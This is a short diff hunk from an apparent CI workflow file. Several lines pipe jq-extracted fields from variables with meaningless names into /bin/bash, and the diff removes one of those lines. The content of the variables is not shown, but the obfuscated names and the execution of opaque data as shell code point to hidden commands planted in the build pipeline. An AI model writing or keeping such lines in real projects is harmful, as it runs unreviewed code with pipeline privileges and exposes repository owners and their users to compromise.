@@ -27,7 +27,6 @@ jobs:
           echo $zw617 | jq -r .pyspc89017 | /bin/bash
           printf '%s' "$pm7733" | jq -r .ph9276 | /bin/bash
           printf '%s' "$voxo86" | jq -r .r47 | /bin/bash
-          printf '%s' "$m716" | jq -r .uz6779 | /bin/bash
           printf '%s' "$q617" | jq -r .i8 | /bin/bash
 
       - name: Persist output
